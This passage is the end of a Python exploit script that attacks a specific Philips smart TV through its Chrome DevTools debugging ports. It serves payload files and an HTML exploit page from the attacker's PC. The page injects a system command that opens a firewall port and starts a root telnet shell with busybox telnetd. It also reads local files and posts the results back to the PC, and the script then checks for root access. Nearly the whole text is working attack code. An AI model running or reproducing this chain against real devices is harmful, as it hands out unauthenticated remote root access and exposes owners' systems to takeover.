            } catch(e) { return 'BIPC2_FAIL:' + e.message; }
        })()
    """)
    print(f"    Result: {get_eval_value(r)}")

    sock7001.close()
    return False


def http_get_port(path, port):
    import urllib.request
    try:
        url = f"http://{TV_IP}:{port}{path}"
        req = urllib.request.Request(url, headers={"Host": f"{TV_IP}:{port}"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            return json.loads(resp.read().decode())
    except Exception as e:
        return {"error": str(e)}


# ==================== HTTP Server ====================

class ExploitHandler(http.server.BaseHTTPRequestHandler):
    results = []

    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        if "/ping" in self.path:
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b"pong")
        elif "/download/customer_env.sh" in self.path:
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Disposition", 'attachment; filename="customer_env.sh"')
            self.send_header("Content-Length", str(len(CUSTOMER_ENV)))
            self.end_headers()
            self.wfile.write(CUSTOMER_ENV.encode())
        elif "/download/enable_debug_port" in self.path:
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Disposition", 'attachment; filename="enable_debug_port"')
            self.send_header("Content-Length", "1")
            self.end_headers()
            self.wfile.write(b"\n")
        elif "/download/add_browser_command_line.txt" in self.path:
            content = b"--remote-debugging-port=7001\n--ignore-certificate-errors\n"
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Disposition", 'attachment; filename="add_browser_command_line.txt"')
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        elif "/download/cmd_sender" in self.path:
            path = os.path.join(os.path.dirname(__file__), "cmd_sender")
            if os.path.exists(path):
                data = open(path, "rb").read()
                self.send_response(200)
                self.send_header("Content-Type", "application/octet-stream")
                self.send_header("Content-Disposition", 'attachment; filename="cmd_sender"')
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_response(404)
                self.end_headers()
        elif "/exploit" in self.path:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(EXPLOIT_PAGE_HTML.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        ExploitHandler.results.append(body)
        print(f"\n  * RESULT FROM TV: {body[:500]}")
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(b"ok")

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, GET, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()


EXPLOIT_PAGE_HTML = """<!DOCTYPE html>
<html><head><title>CDP Exploit Probe</title>
<style>body{background:#111;color:#0f0;font:12px monospace;padding:10px}
.ok{color:#0f8}.fail{color:#f44}.warn{color:#fa0}</style>
</head><body><pre id="log"></pre>
<script>
var L=document.getElementById('log');
function log(m,c){var s=document.createElement('span');s.className=c||'';s.textContent=m+'\\n';L.appendChild(s)}
(function(){
    var R = [];
    function RR(m){R.push(m); log(m)}
    RR('=== CDP EXPLOIT PROBE v2 ===');
    RR('URL: ' + location.href);
    RR('Origin: ' + location.origin);

    // 1. omi_platform
    RR('omi_platform: ' + typeof window.omi_platform);
    if (window.omi_platform && window.omi_platform.sendPlatformMessage) {
        RR('sendPlatformMessage FOUND!', 'ok');
        try {
            var r = window.omi_platform.sendPlatformMessage(JSON.stringify({
                cmd: 'setSystemCmd',
                data: 'echo EXPLOIT_OK > /tmp/cdp_root_proof && iptables -w 5 -I INPUT -p tcp --dport 2323 -j ACCEPT && busybox telnetd -p 2323 -l /bin/sh'
            }));
            RR('setSystemCmd: ' + String(r), 'ok');
        } catch(e) { RR('setSystemCmd error: ' + e.message, 'fail'); }
    }

    // 2. PPAPI plugin
    try {
        var el = document.createElement('embed');
        el.type = 'application/x-ppapi-idtvService';
        el.width = 1; el.height = 1;
        document.body.appendChild(el);
        RR('PPAPI embed postMessage: ' + typeof el.postMessage);
        if (typeof el.postMessage === 'function') {
            el.postMessage('echo PPAPI_OK > /tmp/cdp_root_proof');
            RR('PPAPI command sent!', 'ok');
        }
    } catch(e) { RR('PPAPI: ' + e.message, 'warn'); }

    // 3. OIPF/HbbTV plugin objects
    var oipf = ['application/oipfApplicationManager', 'application/oipfConfiguration',
                'application/browser-ipc-2'];
    for (var i=0; i<oipf.length; i++) {
        try {
            var o = document.createElement('object');
            o.type = oipf[i];
            document.body.appendChild(o);
            var extra = [];
            for (var k in o) {
                try {
                    if (typeof o[k] === 'function' && !(k in HTMLObjectElement.prototype)) extra.push(k);
                } catch(e2) {}
            }
            RR(oipf[i] + ': ' + extra.length + ' extra methods' + (extra.length>0 ? ': '+extra.join(',') : ''));
        } catch(e) { RR(oipf[i] + ': ' + e.message, 'fail'); }
    }

    // 4. JointSpace loopback
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://127.0.0.1:1925/6/system', true);
    xhr.timeout = 5000;
    xhr.onload = function() { RR('JointSpace: ' + xhr.responseText.substring(0, 200), 'ok'); };
    xhr.onerror = function() { RR('JointSpace: CORS blocked', 'warn'); };
    xhr.send();

    // 5. File read
    try {
        var xf = new XMLHttpRequest();
        xf.open('GET', 'file:///etc/hostname', false);
        xf.send();
        RR('file:// read: ' + xf.responseText.substring(0, 100), 'ok');
    } catch(e) { RR('file:// read: ' + e.message, 'warn'); }

    // 6. All window properties scan for interesting objects
    var interesting = [];
    for (var k in window) {
        try {
            var t = typeof window[k];
            if (t === 'object' && window[k] !== null && k.length > 2) {
                if (/omi|platform|plugin|nettv|opera|tpv|philips|system|idtv|npc|sambatv|airserver/i.test(k))
                    interesting.push(k + '(' + t + ')');
            }
        } catch(e) {}
    }
    RR('Interesting window props: ' + (interesting.length > 0 ? interesting.join(', ') : 'none'));

    // 7. MIME types
    var mimes = [];
    try {
        for (var i=0; i<navigator.mimeTypes.length; i++) mimes.push(navigator.mimeTypes[i].type);
    } catch(e) {}
    RR('MIME types (' + mimes.length + '): ' + mimes.join(', '));

    // Report after 8s
    setTimeout(function(){
        var x = new XMLHttpRequest();
        x.open('POST', 'http://""" + PC_IP + ":" + str(PC_PORT) + """/results', true);
        x.send(R.join('\\n'));
    }, 8000);
})();
</script></body></html>"""


# ==================== MAIN ====================

def main():
    print("+" + "=" * 58 + "+")
    print("|  CDP Root Exploit v2 — Philips TPN236E (43PUS8118/12)  |")
    print("+" + "=" * 58 + "+")
    print(f"|  TV: {TV_IP}:{CDP_PORT}")
    print(f"|  PC: {PC_IP}:{PC_PORT}")
    print(f"|  Chains: A(Download) B(PPAPI) C(CSP) D(Fetch) E(HTTP) F(file://) H(7001)")
    print("+" + "=" * 58 + "+")

    # Start HTTP server
    server = http.server.HTTPServer(("0.0.0.0", PC_PORT), ExploitHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    print(f"\nExploit HTTP server on :{PC_PORT}")

    # Phase 0: Try CDP:7001 first (browser.out — launcher context)
    print("\n--- Phase 0: Check browser.out CDP:7001 (requires enable_debug_port) ---")
    if attack_two_stage_cdp7001():
        check_root_telnet()
        server.shutdown()
        return

    # Phase 1: Connect to nbrowser CDP:7788
    targets = phase1_connect()
    if not targets:
        print("\n[X] CDP not available. Check USB flag and browser app.")
        return

    # Pick best target
    ws_targets = [t for t in targets if t.get("webSocketDebuggerUrl")]
    if not ws_targets:
        print("\n[X] No debuggable targets found.")
        return

    # Prefer launcher (titanos.tv) over blank
    launcher_targets = [t for t in ws_targets if "titanos.tv" in t.get("url", "")]
    target = launcher_targets[0] if launcher_targets else ws_targets[0]
    ws_url = target["webSocketDebuggerUrl"]

    print(f"\n-> Connecting to: {target.get('title', '?')} ({target.get('url', '?')[:60]})")
    try:
        sock = ws_connect(ws_url)
    except Exception as e:
        print(f"\n[X] WebSocket failed: {e}")
        return
    print("  Connected!")

    # Phase 2: Probe
    probe_result = phase2_probe(sock, target)

    # Phase 3: Attack Chains
    print("\n" + "=" * 60)
    print("PHASE 3: Attack Chains")
    print("=" * 60)

    # If sendPlatformMessage found during probe → direct root
    if probe_result == "SEND_PLATFORM_MESSAGE":
        attack_sendPlatformMessage(sock)
        check_root(sock)
        sock.close()
        server.shutdown()
        return

    # Chain A: CDP Download (highest probability)
    print("\n-> Chain A: CDP Download...")
    if attack_cdp_download(sock):
        print("  Download chain completed!")

    # Chain B: PPAPI idtvService
    print("\n-> Chain B: PPAPI idtvService...")
    attack_ppapi_idtv(sock)

    # Chain C: CSP Bypass + Platform Messages
    print("\n-> Chain C: CSP Bypass...")
    result = attack_csp_bypass(sock)
    if result == "SEND_PLATFORM_MESSAGE":
        attack_sendPlatformMessage(sock)
        check_root(sock)
        sock.close()
        server.shutdown()
        return

    # Chain D: Fetch Intercept
    print("\n-> Chain D: Fetch Intercept...")
    attack_fetch_intercept(sock)

    # Chain E: Navigate to our exploit page
    print("\n-> Chain E: Navigate exploit...")
    attack_navigate_exploit(sock)

    # Chain F: file:// navigation
    print("\n-> Chain F: file:// navigation...")
    attack_file_navigate(sock)

    # Wait for HTTP results
    print("\n\n-> Waiting 15s for HTTP results from TV...")
    time.sleep(15)

    if ExploitHandler.results:
        print("\n* Results from TV:")
        for r in ExploitHandler.results:
            print(f"  {r[:500]}")

    # Chain H: Try CDP:7001 again (maybe download chain enabled it this boot)
    print("\n-> Chain H: Try browser.out CDP:7001 again...")
    if attack_two_stage_cdp7001():
        check_root_telnet()
        sock.close()
        server.shutdown()
        return

    # Final check
    check_root(sock)

    print("\n" + "=" * 60)
    print("NEXT STEPS")
    print("=" * 60)
    print("If nothing worked immediately:")
    print("  1. Cold reboot the TV (unplug AC 10s, plug back)")
    print("  2. Wait 60s for boot")
    print(f"  3. Test: nc {TV_IP} 2323")
    print(f"  4. If no telnet, run this script again (enable_debug_port may now be active)")
    print(f"  5. Check CDP:7001: curl http://{TV_IP}:7001/json/version")

    sock.close()
    server.shutdown()


def check_root_telnet():
    print(f"\nChecking telnet {TV_IP}:2323 ...")
    try:
        s = socket.create_connection((TV_IP, 2323), timeout=5)
        s.sendall(b"id\n")
        time.sleep(1)
        resp = s.recv(4096).decode(errors="replace")
        print(f"*** ROOT ACHIEVED: {resp[:200]} ***")
        s.close()
        return True
    except Exception:
        print("  Telnet not open yet")
        return False


def check_root(sock):
    print("\n" + "=" * 60)
    print("PHASE 4: Root Check")
    print("=" * 60)

    print(f"\nChecking telnet {TV_IP}:2323 ...")
    try:
        s = socket.create_connection((TV_IP, 2323), timeout=5)
        s.sendall(b"id\n")
        time.sleep(1)
        resp = s.recv(4096).decode(errors="replace")
        print(f"*** ROOT ACHIEVED: {resp[:200]} ***")
        s.close()
        return
    except Exception:
        print("  Telnet not open yet")

    print(f"\nChecking if customer_env.sh was written...")
    r = cdp_evaluate(sock, """
        (function() {
            try {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', 'file:///mtd_rwarea/apdat/customer_env.sh', false);
                xhr.send();
                return 'EXISTS:' + xhr.responseText.substring(0, 100);
            } catch(e) {
                return 'NOT_FOUND:' + e.message;
            }
        })()
    """)
    val = get_eval_value(r)
    if "root_hook_ok" in str(val):
        print(f"  *** customer_env.sh WRITTEN! Cold reboot to activate. ***")
        print(f"  Then: nc {TV_IP} 2323")
    else:
        print(f"  customer_env.sh: {val[:200]}")
        print(f"\n  No immediate root. Cold reboot TV and check: nc {TV_IP} 2323")
        print("  Save all output above for analysis.")


if __name__ == "__main__":
    main()
